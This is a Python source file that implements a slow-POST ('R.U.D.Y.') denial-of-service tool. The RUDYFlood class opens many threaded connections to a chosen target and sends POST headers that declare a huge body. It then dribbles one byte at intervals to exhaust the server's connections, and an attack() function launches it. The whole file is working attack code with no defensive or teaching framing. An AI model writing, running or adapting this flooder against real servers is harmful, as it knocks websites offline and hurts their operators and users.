import socket
import threading
import time
import random

class RUDYFlood:
    def __init__(self, target, port, threads, duration, spoof=False, use_https=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.stop_event = threading.Event()
        self.use_https = use_https
        self.connections = []

    def _attack(self):
        while not self.stop_event.is_set():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(15)
                sock.connect((self.target, self.port))
                if self.use_https:
                    import ssl
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.target)

                # Send POST with huge Content-Length but send body slowly
                body_start = f"id={random.randint(1,9999)}&data="
                content_length = 1000000
                headers = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: Mozilla/5.0\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                sock.send(headers.encode())
                sock.send(body_start.encode())

                self.connections.append(sock)
                # Keep sending one byte at a time
                while not self.stop_event.is_set():
                    try:
                        sock.send(b"a")
                        time.sleep(random.uniform(5, 15))
                    except Exception:
                        break
                sock.close()
            except Exception:
                pass
            finally:
                if sock in self.connections:
                    self.connections.remove(sock)

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for sock in self.connections:
            try:
                sock.close()
            except Exception:
                pass

def attack(target, port, threads, duration, spoof=False, use_https=False):
    flood = RUDYFlood(target, port, threads, duration, spoof, use_https)
    flood.start()
